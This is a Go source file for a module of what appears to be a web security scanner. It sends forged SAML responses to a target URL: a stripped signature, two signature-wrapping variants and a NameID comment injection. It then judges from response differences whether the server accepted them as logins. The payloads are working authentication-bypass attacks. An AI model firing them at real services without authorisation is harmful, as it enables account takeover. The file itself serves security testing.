package core

import (
	"context"
	"encoding/base64"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

// SAMLAssertionTestingResult holds the result of the SAMLAssertionTesting module execution.
type SAMLAssertionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// SAMLAssertionTesting executes the saml_assertion_testing security technique.
type SAMLAssertionTesting struct {
	BaseModule
	Target  string
	results []SAMLAssertionTestingResult
}

// NewSAMLAssertionTesting creates a new instance.
func NewSAMLAssertionTesting(target string) *SAMLAssertionTesting {
	return &SAMLAssertionTesting{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *SAMLAssertionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

// encodeSAML base64-encodes a raw SAML response document for the
// SAMLResponse form parameter.
func encodeSAML(doc string) string {
	return base64.StdEncoding.EncodeToString([]byte(doc))
}

const samlResponseHeader = `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">` +
	`<Issuer>https://idp/firestarter</Issuer>`

var samlPayloads = []string{
	// Stripped signature payload: minimal unsigned response.
	encodeSAML(`<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"><SamlAuth>Admin</SamlAuth></samlp:Response>`),
	// XSW #1 — unsigned duplicate assertion injected before the signed one so
	// document-order-first selection processes the attacker's copy.
	encodeSAML(samlResponseHeader +
		`<saml2:Assertion ID="fake_firestarter_assertion" version="2.0" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">` +
		`<Issuer>https://idp/firestarter</Issuer><Subject><NameID>PWN</NameID></Subject></saml2:Assertion>` +
		`<saml2:Assertion ID="signed_firestarter_assertion" version="2.0">` +
		`<Issuer>https://idp/firestarter</Issuer><Subject><NameID>user</NameID></Subject></saml2:Assertion>` +
		`</samlp:Response>`),
	// XSW #2 — legitimate signed assertion nested inside an attacker-controlled
	// unsigned wrapper assertion; wrappers that select the outer assertion are fooled.
	encodeSAML(samlResponseHeader +
		`<saml2:Assertion ID="wrapper_firestarter" version="2.0" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">` +
		`<Issuer>https://idp/firestarter</Issuer><Subject><NameID>PWN</NameID></Subject>` +
		`<Advice><saml2:Assertion ID="legit_firestarter" version="2.0">` +
		`<Issuer>https://idp/firestarter</Issuer><Subject><NameID>user</NameID></Subject>` +
		`</saml2:Assertion></Advice></saml2:Assertion></samlp:Response>`),
	// NameID comment injection: an XML comment inside the NameID element makes
	// signature validation and application identity parsing disagree.
	encodeSAML(samlResponseHeader +
		`<saml2:Assertion ID="comment_firestarter" version="2.0" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">` +
		`<Issuer>https://idp/firestarter</Issuer><Subject>` +
		`<NameID>admin<!-- -->PWN</NameID></Subject></saml2:Assertion></samlp:Response>`),
}

// samlBaseline holds the outcome of the malformed-payload baseline request.
type samlBaseline struct {
	statusCode int
	body       string
	ok         bool
}

func (m *SAMLAssertionTesting) captureBaseline(ctx context.Context) samlBaseline {
	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, strings.NewReader("SAMLResponse=invalid_baseline_data"))
	if err != nil {
		return samlBaseline{}
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := m.Client.Do(req)
	if err != nil {
		return samlBaseline{}
	}
	defer resp.Body.Close()

	body, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	if err != nil {
		return samlBaseline{}
	}

	return samlBaseline{
		statusCode: resp.StatusCode,
		body:       string(body),
		ok:         true,
	}
}

func (m *SAMLAssertionTesting) Execute(ctx context.Context) ([]SAMLAssertionTestingResult, error) {
	m.results = make([]SAMLAssertionTestingResult, 0)

	baseline := m.captureBaseline(ctx)
	if !baseline.ok {
		m.results = append(m.results, SAMLAssertionTestingResult{
			Target: m.Target,
			Status: statusFromEvidence(EvidenceWeak, false),
			Detail: formatEvidenceDetail(EvidenceWeak, "Baseline request failed (transport or read error); SAML acceptance cannot be judged."),
		})
		return m.results, nil
	}

	jobs := make(chan string, len(samlPayloads))
	for _, p := range samlPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup
	attempted, failed := 0, 0

	for range m.MaxThreads {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.Mu.Lock()
					attempted++
					m.Mu.Unlock()
					if !m.testPayload(ctx, payload, baseline) {
						m.Mu.Lock()
						failed++
						m.Mu.Unlock()
					}
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}

	if attempted > 0 && failed >= attempted {
		m.Mu.Lock()
		m.noteInconclusiveOnce(fmt.Sprintf("All %d probes failed (request or transport errors); SAML assertion acceptance could not be assessed.", attempted))
		m.Mu.Unlock()
	}
	return m.results, nil
}

// samlAuthSignals are positive authentication markers a Service Provider
// returns when it processed a SAML response into an authenticated session.
var samlAuthSignals = []string{"logged in", "sign-on complete", "authenticated", "samlauth", "welcome", "session established"}

// samlNegationPhrases are multi-word rejection markers checked as substrings.
var samlNegationPhrases = []string{"not authenticated", "unauthenticated", "sign in", "log in"}

// samlNegationWords are single-word rejection markers matched as whole words
// only, so words merely containing the marker ("terror", "errored") no
// longer veto an otherwise authenticated page.
var samlNegationWords = map[string]bool{"invalid": true, "error": true, "errors": true}

// samlBodyShowsRejection reports whether a body describes a failed
// authentication flow rather than an accepted forged assertion.
func samlBodyShowsRejection(body string) bool {
	lower := strings.ToLower(body)
	for _, phrase := range samlNegationPhrases {
		if strings.Contains(lower, phrase) {
			return true
		}
	}
	for _, tok := range strings.FieldsFunc(lower, func(r rune) bool {
		return r < 'a' || r > 'z'
	}) {
		if samlNegationWords[tok] {
			return true
		}
	}
	return false
}

// noteInconclusiveOnce appends an inconclusive row unless an identical one
// already exists. Callers must hold m.Mu.
func (m *SAMLAssertionTesting) noteInconclusiveOnce(detail string) {
	wrapped := formatEvidenceDetail(EvidenceWeak, detail)
	for _, r := range m.results {
		if r.Status == "inconclusive" && r.Detail == wrapped {
			return
		}
	}
	m.results = append(m.results, SAMLAssertionTestingResult{
		Target: m.Target,
		Status: statusFromEvidence(EvidenceWeak, false),
		Detail: wrapped,
	})
}

// testPayload sends one forged-SAML probe. It returns false when the probe
// itself failed (request build, transport, or body read error).
func (m *SAMLAssertionTesting) testPayload(ctx context.Context, payload string, baseline samlBaseline) bool {
	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, strings.NewReader("SAMLResponse="+payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := m.Client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	if err != nil {
		return false
	}
	bodyStr := string(body)

	// A transient baseline failure (status 0) must never be judged: 200 != 0
	// would flag every 200 as "accepted".
	if !baseline.ok {
		return true
	}

	// A rejection page can never evidence an accepted forged assertion, even
	// when it happens to contain a positive-sounding marker.
	if samlBodyShowsRejection(bodyStr) {
		return true
	}

	// Judge acceptance only through positive evidence: either the baseline was
	// not OK while the payload request is, or the payload response differs
	// from the baseline with an auth signal present.
	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
		tier := EvaluateDifferentialEvidence(bodyStr, baseline.body, baseline.body, true)
		hasAuthSignal := containsAnyToken(bodyStr, samlAuthSignals)
		baselineRejected := baseline.statusCode >= 400 || !containsAnyToken(baseline.body, samlAuthSignals)
		if baseline.statusCode != resp.StatusCode && hasAuthSignal {
			if baselineRejected {
				tier = EvidenceConfirmed
			} else {
				// The baseline was not clearly rejected, so the "baseline
				// rejected it" differential cannot be claimed.
				tier = EvidenceWeak
			}
		} else if !hasAuthSignal {
			tier = EvidenceWeak
		}
		if tier == EvidenceConfirmed || tier == EvidenceStrong {
			m.Mu.Lock()
			m.RecordPoC(req, nil, "Server processed a malformed/forged SAML Assertion into an authenticated session.")
			m.results = append(m.results, SAMLAssertionTestingResult{
				Target: m.Target,
				Status: statusFromEvidence(tier, false),
				Detail: formatEvidenceDetail(tier, "Server processed a forged SAML Assertion into an authenticated session (forged response accepted; baseline rejected it)."),
			})
			m.Mu.Unlock()
		} else if resp.StatusCode != baseline.statusCode && hasAuthSignal {
			m.Mu.Lock()
			m.noteInconclusiveOnce(fmt.Sprintf("Payload response differed from the baseline (HTTP %d vs %d) with an auth signal, but the baseline was not clearly rejected; SAML acceptance could not be confirmed.",
				baseline.statusCode, resp.StatusCode))
			m.Mu.Unlock()
		}
	}
	return true
}

func init() {
	RegisterModule("saml_assertion_testing", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "")
		onLog(fmt.Sprintf("Starting SAMLAssertionTesting on: %s", target))

		tester := NewSAMLAssertionTesting(target)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
